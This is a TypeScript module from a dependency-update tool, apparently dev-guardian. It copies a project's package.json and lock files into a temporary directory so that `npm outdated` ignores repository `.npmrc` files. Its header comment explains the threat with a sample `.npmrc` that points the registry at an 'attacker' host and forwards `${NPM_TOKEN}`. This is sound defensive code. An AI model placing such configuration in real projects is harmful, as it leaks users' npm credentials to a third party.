/**
 * The directory `deps_update_plan` runs `npm outdated` in: a temporary copy
 * of the project's `package.json` and lock files, and nothing else.
 *
 * npm reads project configuration from the `.npmrc` beside the package it
 * works on (a workspace root's, from a member), and a repository's `.npmrc`
 * decides where npm fetches from, which of the user's credentials it sends
 * there — `registry=https://attacker/` with
 * `//attacker/:_authToken=${NPM_TOKEN}` sends the token npm expands from the
 * environment — and which program it starts for a git dependency (`git=`).
 * No flag turns project configuration off, so npm is handed a package of its
 * own: in a directory dev-guardian created outside the project, the user's
 * configuration is the only one there is. With no `node_modules` beside it,
 * npm reports no `current` version — a fresh checkout's shape, which the npm
 * runner already reads from the project's lock file.
 */

import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  describeReadRefusal,
  PROJECT_FILE_MAX_BYTES,
  PROJECT_LOCKFILE_MAX_BYTES,
  readProjectBytes,
} from '../platform/projectFs.js';

/** What npm reads to answer `outdated` for a package, besides `node_modules`. */
const COPIED: ReadonlyArray<{ name: string; maxBytes: number }> = [
  { name: 'package.json', maxBytes: PROJECT_FILE_MAX_BYTES },
  { name: 'package-lock.json', maxBytes: PROJECT_LOCKFILE_MAX_BYTES },
  { name: 'npm-shrinkwrap.json', maxBytes: PROJECT_LOCKFILE_MAX_BYTES },
];

/** The npm package configuration files a repository may carry, which the copy leaves behind. */
export const NPM_PROJECT_CONFIG = ['.npmrc', '.pnpmrc', '.yarnrc', '.yarnrc.yml'] as const;

export type NpmPlanningCopy = { ok: true; dir: string; dispose(): void } | { ok: false; reason: string };

/** Copies the project's manifest and lock files into a new temporary directory. */
export function npmPlanningCopy(projectPath: string): NpmPlanningCopy {
  const files: Array<{ name: string; bytes: Buffer }> = [];
  for (const { name, maxBytes } of COPIED) {
    const read = readProjectBytes(projectPath, join(projectPath, name), maxBytes);
    if (read.status === 'absent') continue;
    if (read.status === 'refused') return { ok: false, reason: `${name} was not read: ${describeReadRefusal(read.reason)}` };
    files.push({ name, bytes: read.bytes });
  }
  if (!files.some((f) => f.name === 'package.json')) return { ok: false, reason: 'package.json is not a file in the project' };
  const dir = mkdtempSync(join(tmpdir(), 'guardian-npm-plan-'));
  const dispose = (): void => rmSync(dir, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
  try {
    for (const f of files) writeFileSync(join(dir, f.name), f.bytes, { flag: 'wx' });
  } catch (e) {
    dispose();
    return { ok: false, reason: `the copy could not be written: ${e instanceof Error ? e.message : String(e)}` };
  }
  return { ok: true, dir, dispose };
}
